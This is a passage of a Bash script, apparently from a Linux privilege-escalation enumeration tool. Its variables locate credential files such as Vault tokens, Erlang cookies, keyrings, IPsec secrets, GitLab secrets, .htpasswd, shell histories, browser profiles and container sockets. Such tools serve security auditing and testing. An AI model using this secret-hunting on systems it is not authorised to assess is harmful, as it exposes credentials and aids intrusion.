  PSTORAGE_VAULT_SSH_TOKEN=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.vault-token$" | sort | uniq | head -n 70)
  PSTORAGE_COUCHDB=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "couchdb$" | sort | uniq | head -n 70)
  PSTORAGE_REDIS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "redis\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_MOSQUITTO=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "mosquitto\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_NEO4J=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "neo4j$" | sort | uniq | head -n 70)
  PSTORAGE_CLOUD_INIT=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "cloud\.cfg$" | sort | uniq | head -n 70)
  PSTORAGE_ERLANG=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.erlang\.cookie$" | sort | uniq | head -n 70)
  PSTORAGE_GMV_AUTH=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "gvm-tools\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_IPSEC=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "ipsec\.secrets$|ipsec\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_IRSSI=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.irssi$" | sort | uniq | head -n 70)
  PSTORAGE_KEYRING=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "keyrings$|.*\.keyring$|.*\.keystore$|.*\.jks$" | sort | uniq | head -n 70)
  PSTORAGE_FILEZILLA=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "filezilla$|filezilla\.xml$|recentservers\.xml$" | sort | uniq | head -n 70)
  PSTORAGE_BACKUP_MANAGER=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "storage\.php$|database\.php$" | sort | uniq | head -n 70)
  PSTORAGE_SPLUNK=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "passwd$" | sort | uniq | head -n 70)
  PSTORAGE_GITLAB=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/lib' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "secrets\.yml$|gitlab\.yml$|gitlab\.rm$" | sort | uniq | head -n 70)
  PSTORAGE_PGP_GPG=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E 'README.gnupg' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.pgp$|.*\.gpg$|.*\.gnupg$" | sort | uniq | head -n 70)
  PSTORAGE_CACHE_VI=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.swp$|.*\.viminfo$" | sort | uniq | head -n 70)
  PSTORAGE_DOCKER=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "docker\.socket$|docker\.sock$|Dockerfile$|docker-compose\.yml$|dockershim\.sock$|containerd\.sock$|crio\.sock$|frakti\.sock$|rktlet\.sock$" | sort | uniq | head -n 70)
  PSTORAGE_FIREFOX=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "\.mozilla$|Firefox$" | sort | uniq | head -n 70)
  PSTORAGE_CHROME=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "google-chrome$|Chrome$" | sort | uniq | head -n 70)
  PSTORAGE_OPERA=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "com\.operasoftware\.Opera$" | sort | uniq | head -n 70)
  PSTORAGE_SAFARI=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "Safari$" | sort | uniq | head -n 70)
  PSTORAGE_AUTOLOGIN=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "autologin$|autologin\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_FASTCGI=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "fastcgi_params$" | sort | uniq | head -n 70)
  PSTORAGE_SNMP=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "snmpd\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_PYPIRC=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.pypirc$" | sort | uniq | head -n 70)
  PSTORAGE_POSTFIX=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "postfix$" | sort | uniq | head -n 70)
  PSTORAGE_CLOUDFLARE=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.cloudflared$" | sort | uniq | head -n 70)
  PSTORAGE_HISTORY=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*_history.*$" | sort | uniq | head -n 70)
  PSTORAGE_HTTP_CONF=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "httpd\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_HTPASSWD=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.htpasswd$" | sort | uniq | head -n 70)
